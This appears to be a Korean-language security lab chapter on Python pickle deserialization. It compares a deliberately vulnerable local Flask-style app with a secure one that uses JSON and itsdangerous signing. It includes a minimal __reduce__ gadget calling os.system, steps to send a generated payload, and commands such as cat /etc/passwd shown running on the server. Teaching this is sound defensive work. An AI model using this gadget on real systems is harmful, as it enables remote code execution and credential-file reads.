# Chapter 08: 역직렬화(Deserialization) 취약점 실습

## 학습 목표
- Pickle 역직렬화 취약점의 원리 이해
- RCE(Remote Code Execution) 공격 실습
- 안전한 직렬화 방법 습득 (JSON + 서명)

## 실습 환경

```bash
cd ch08-deserialization
docker-compose up -d

# 취약한 버전: http://localhost:5001
# 안전한 버전: http://localhost:5002
```

## Pickle 역직렬화란?

Python의 `pickle` 모듈은 객체를 바이트로 변환(직렬화)하고 복원(역직렬화)합니다.
**문제:** `pickle.loads()`는 역직렬화 시 `__reduce__` 메서드를 호출하여 **임의 코드를 실행**할 수 있습니다.

```python
class Malicious:
    def __reduce__(self):
        return (os.system, ("whoami",))  # 역직렬화 시 실행됨!

pickle.loads(pickled_data)  # → os.system("whoami") 실행
```

## 취약점 비교

| 항목 | 취약한 버전 (5001) | 안전한 버전 (5002) |
|------|-------------------|-------------------|
| 직렬화 방식 | `pickle` (코드 실행 가능) | `JSON` (데이터만 저장) |
| 무결성 검증 | 없음 | `itsdangerous` 서명 |
| 입력 검증 | 없음 | 화이트리스트 필드만 허용 |

## 공격 실습 (취약한 버전)

### 단계 1: 정상 세션 생성

```bash
# 세션 생성 (pickle로 직렬화됨)
curl.exe -X POST http://localhost:5001/save_session -d "username=test"
```

**응답:** Base64로 인코딩된 pickle 데이터가 반환됩니다.

### 단계 2: 악성 페이로드 생성

```bash
# exploit.py 실행하여 악성 pickle 페이로드 생성
python vulnerable/exploit.py
```

**출력 예시:**
```
Pickle RCE Exploit Generator
============================================================
생성된 페이로드 (Base64):
------------------------------------------------------------
gASVNAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjB9pZCAmJiB3aG9...
------------------------------------------------------------
```

### 단계 3: 악성 페이로드 전송

1. http://localhost:5001 접속
2. **"세션 로드 (Base64 Pickle)"** 폼에 생성된 페이로드 붙여넣기
3. Submit 클릭

### 단계 4: 서버 로그에서 명령 실행 확인

```bash
docker-compose logs vulnerable
```

서버 로그에서 `id`, `whoami`, `cat /etc/passwd` 등의 명령이 실행된 결과를 확인할 수 있습니다.

### 공격 원리 상세

```
[공격자]
    ↓ __reduce__ 메서드에 os.system("whoami") 삽입
    ↓ pickle.dumps() → Base64 인코딩
    ↓
[취약한 서버]
    ↓ Base64 디코딩 → pickle.loads() 호출
    ↓ __reduce__가 반환한 함수 실행
    ↓ os.system("whoami") 실행됨!
    ↓
[결과: 서버에서 임의 명령 실행 (RCE)]
```

## 방어 확인 (안전한 버전)

```bash
# 안전한 버전 — 세션 생성 (JSON + 서명)
curl.exe -X POST http://localhost:5002/save_session -d "username=test"
# 결과: itsdangerous로 서명된 토큰 반환

# 변조된 토큰 전송 시 → 거부됨
curl.exe -X POST http://localhost:5002/load_session -d "session_token=tampered_data"
# 결과: "Invalid or tampered token" 에러
```

## 방어 기법

### 1. pickle 사용 금지

신뢰할 수 없는 데이터에는 **절대** `pickle.loads()` 사용 금지

### 2. JSON 사용

```python
import json
data = json.loads(user_input)  # 안전: 코드 실행 불가능
```

### 3. itsdangerous로 서명

```python
from itsdangerous import URLSafeSerializer

serializer = URLSafeSerializer(SECRET_KEY)

# 직렬화 + 서명
token = serializer.dumps(data)

# 역직렬화 + 서명 검증 (변조 시 BadSignature 예외)
data = serializer.loads(token)
```

### 4. 화이트리스트 필드만 허용

```python
allowed_fields = {"username", "role", "preferences"}
safe_data = {k: v for k, v in data.items() if k in allowed_fields}
```

## 테스트 방법

### 1. pytest 실행 (권장)

```bash
cd ch08-deserialization
python -m pytest test_app.py -v
```

**예상 출력:**
```
test_app.py::TestVulnerableApp::test_index PASSED                    [ 25%]
test_app.py::TestVulnerableApp::test_save_session PASSED             [ 50%]
test_app.py::TestSecureApp::test_index PASSED                        [ 75%]
test_app.py::TestSecureApp::test_save_session PASSED                 [100%]

============================== 4 passed in 0.38s ==============================
```

**참고:**
- 실제 Pickle RCE 공격은 Docker 환경에서 수동 테스트로 확인하세요
- pytest는 기본 기능(세션 생성)만 테스트합니다

**개별 테스트 실행:**
```bash
python -m pytest test_app.py::TestVulnerableApp -v
python -m pytest test_app.py::TestSecureApp -v
```

### 2. 수동 테스트 (Docker)

#### 취약한 버전 테스트
1. http://localhost:5001 접속
2. "Create Session" 으로 정상 세션 생성
3. `python vulnerable/exploit.py` 실행하여 악성 페이로드 생성
4. "Load Session" 폼에 페이로드 붙여넣기 → 서버에서 명령 실행됨

#### 안전한 버전 테스트
1. http://localhost:5002 접속
2. "Create Session" 으로 세션 생성 (서명된 토큰 반환)
3. 토큰을 변조하여 "Load Session"에 입력 → "Invalid or tampered token" 에러

## 체크리스트
- [ ] 외부 입력에 `pickle.loads()` 사용하지 않기
- [ ] JSON, MessagePack 등 안전한 포맷 사용
- [ ] 필요 시 서명으로 무결성 검증 (`itsdangerous`)
- [ ] `yaml.safe_load()` 사용 (`yaml.load()` 금지)
- [ ] 화이트리스트 필드만 역직렬화
